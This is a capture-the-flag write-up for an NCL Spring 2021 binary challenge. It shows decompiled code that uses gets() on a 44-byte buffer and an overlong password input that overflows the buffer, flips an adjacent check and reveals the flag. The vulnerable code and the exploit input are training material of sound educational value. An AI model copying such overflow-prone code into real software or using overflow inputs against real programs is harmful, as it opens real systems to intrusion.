---
title: NCL Spring 2021 Gym Challenge | Enumeration and Exploitation
published: false
---

## [](#header-2) Binary 1

> We need to break into a program that the hackers have created. You will need to provide the identifier, 7074, as the only argument to the program.

### [](#header-3)Solution

Using **Ghidra**, I was able to see the code of the main function.

```
undefined8 main(int param_1,undefined8 *param_2)

{
  size_t sVar1;
  char input [44];
  int pass;
  
  if (param_1 != 2) {
    printf("usage: %s <tid>\n",*param_2);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  sVar1 = strlen((char *)param_2[1]);
  if (sVar1 != 4) {
    printf("usage: %s <tid>\n",*param_2);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pass = 0;
  printf("Please enter a password: ");
  gets(input);
  if (pass == 0) {
    puts("Try again.");
  }
  else {
    fg((long)param_2);
  }
  return 0;
}

```

The function is checking if the _pass_ variable is 0.
The fact that the character size limit is only 44 bytes causes a buffer overflow vulnerability, which can modify the value of pass to not be 0, thus giving us the flag.
I obtained the flag by entering 45 characters, which is bigger than 44 bytes.

```Linux
\\Linux command
$./file 7074
Please enter a password: 1234123412341234123412341234123412341234123412341
your tid: 7074
flag
```
